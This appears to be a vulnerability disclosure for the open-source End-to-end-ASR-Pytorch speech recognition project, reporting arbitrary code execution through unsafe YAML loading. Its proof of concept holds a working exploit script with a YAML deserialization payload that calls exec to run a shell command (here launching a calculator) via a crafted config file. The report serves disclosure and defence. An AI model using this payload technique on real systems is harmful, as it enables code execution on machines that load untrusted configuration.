# Description

`End-to-end-ASR-Pytorch` is an open source project (formerly named Listen, Attend and Spell - PyTorch Implementation) for end-to-end ASR implemented with Pytorch, the well known deep learning toolkit, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/Alexander-H-Liu/End-to-end-ASR-Pytorch
```

### Run exploit.py
```
import os
#os.system('git clone https://github.com/Alexander-H-Liu/End-to-end-ASR-Pytorch')
os.chdir('End-to-end-ASR-Pytorch/')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
os.system('python main.py --config config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
